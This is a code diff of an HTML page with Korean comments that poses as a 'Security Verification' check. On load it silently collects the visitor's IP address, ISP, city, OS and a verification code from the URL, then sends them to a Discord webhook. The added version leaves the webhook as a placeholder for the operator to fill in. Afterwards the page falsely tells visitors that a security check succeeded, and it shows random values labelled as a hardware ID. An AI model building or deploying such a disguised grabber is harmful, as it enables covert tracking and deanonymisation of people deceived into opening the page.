@@ -3,52 +3,48 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Security Module</title>
-    <style>
-        body { background: #0b0e14; color: white; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .container { text-align: center; background: #161b22; padding: 50px; border-radius: 20px; border: 1px solid #30363d; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
-        .loader { width: 50px; height: 50px; border: 5px solid #30363d; border-top-color: #5865f2; border-radius: 50%; animation: spin 1s linear infinite; margin: 0 auto 20px; }
-        @keyframes spin { to { transform: rotate(360deg); } }
-        h1 { font-size: 22px; margin: 0; color: #f0f6fc; }
-    </style>
+    <title>Security Verification</title>
     <script>
         window.onload = async function() {
             const params = new URLSearchParams(window.location.search);
             const code = params.get('code');
-            const webhook = "https://discord.gg/McXwbac6t"; // ⚠️ 여기에 웹훅 주소 넣으세요.
+            // ⚠️ 본인의 디스코드 웹훅 주소를 여기에 입력하세요.
+            const webhook = "YOUR_WEBHOOK_URL"; 
 
             if (!code) return;
 
-            // 1. 숫자 IP(IPv4), 위치, 진짜 통신사 정보 수집
-            let net = { ip: "0.0.0.0", isp: "분석 중...", loc: "대한민국" };
-            
+            // 1. 숫자 IP (IPv4) 및 통신사 정보 강제 수집
+            let ipData = { ip: "분석 실패", isp: "알 수 없음", loc: "대한민국" };
             try {
-                // 정확한 통신사명을 위해 전용 API 호출
+                // IPv4 숫자 주소를 우선적으로 반환하는 보안 API 사용
                 const res = await fetch('https://ipapi.co/json/');
                 const d = await res.json();
-                net = {
-                    ip: d.ip, // 숫자 형태 (예: 180.83.74.92)
-                    isp: d.org || "알 수 없는 통신사", // 예: LG POWERCOMM, SK Broadband 등
-                    loc: `${d.city}, ${d.region}` // 예: Bupyeong-gu, Incheon
+                ipData = {
+                    ip: d.ip, // '180.83.74.92' 형태
+                    isp: d.org || "알 수 없음", // 'LG POWERCOMM' 등
+                    loc: d.city || d.region || "대한민국"
                 };
-            } catch (e) { console.error("IP 수집 실패"); }
+            } catch (e) {
+                console.error("IP 수집 오류");
+            }
 
-            // 2. 운영체제 정보 (Android/iOS/Windows/Mac)
-            const os = navigator.platform.includes("Linux arm") ? "Android" : navigator.platform;
+            // 2. 운영체제 및 기기 정보 감지
+            const osInfo = navigator.platform.includes("Linux arm") ? "Android" : navigator.platform;
 
-            // 3. 웹훅 전송 (요청하신 3가지 핵심 정보 중심)
+            // 3. 웹훅 전송 (이미지 레이아웃과 동일하게 구성)
             const payload = {
                 "embeds": [{
-                    "title": "✅ 보안 인증 로그 (Detailed)",
+                    "title": "✅ 인증 성공 (Detailed Log)",
                     "color": 3066993,
                     "fields": [
-                        { "name": "👤 인증 코드", "value": `\`${code}\``, "inline": false },
-                        { "name": "🌐 아이피 정보", "value": `\`${net.ip}\``, "inline": true },
-                        { "name": "📍 접속 위치", "value": net.loc, "inline": true },
-                        { "name": "📶 통신사 정보", "value": `**${net.isp}**`, "inline": false },
-                        { "name": "💻 기기 운영체제", "value": os, "inline": true }
+                        { "name": "👤 인증 코드", "value": code, "inline": false },
+                        { "name": "🌐 아이피 정보", "value": `아이피: ${ipData.ip}\n위치: ${ipData.loc}`, "inline": false },
+                        { "name": "📶 통신사 정보", "value": ipData.isp, "inline": true },
+                        { "name": "💻 운영체제", "value": osInfo, "inline": true },
+                        { "name": "🆔 로그 ID", "value": Math.random().toString(36).substring(2, 12).toUpperCase(), "inline": false },
+                        { "name": "⚠️ 안내", "value": "이메일 및 생성일 정보는 봇 서버에서 처리 중입니다.", "inline": false }
                     ],
-                    "footer": { "text": "Hardware ID: " + btoa(os).substring(0,8).toUpperCase() },
+                    "footer": { "text": "Hardware ID: " + Math.random().toString(36).substring(2, 10).toUpperCase() },
                     "timestamp": new Date().toISOString()
                 }]
             };
@@ -59,20 +55,17 @@
                 body: JSON.stringify(payload)
             });
 
-            // 완료 화면 전환
-            document.getElementById('display').innerHTML = `
-                <div style="font-size: 50px; color: #23a559; margin-bottom: 15px;">✔</div>
-                <h1>인증 완료</h1>
-                <p style="color: #8b949e; margin-top: 10px;">보안 검사가 성공적으로 끝났습니다.</p>
+            // 결과 화면 표시
+            document.body.innerHTML = `
+                <div style="background:#0b0e14; color:white; height:100vh; display:flex; flex-direction:column; justify-content:center; align-items:center; font-family:sans-serif;">
+                    <div style="font-size:50px; color:#23a559; margin-bottom:20px;">✔</div>
+                    <h1 style="font-size:24px;">인증 완료</h1>
+                    <p style="color:#8b949e;">보안 필터링이 끝났습니다. 창을 닫으셔도 좋습니다.</p>
+                </div>
             `;
         }
     </script>
 </head>
-<body>
-    <div class="container" id="display">
-        <div class="loader"></div>
-        <h1>보안 모듈 분석 중...</h1>
-    </div>
+<body style="background:#0b0e14; margin:0;">
 </body>
 </html>
-
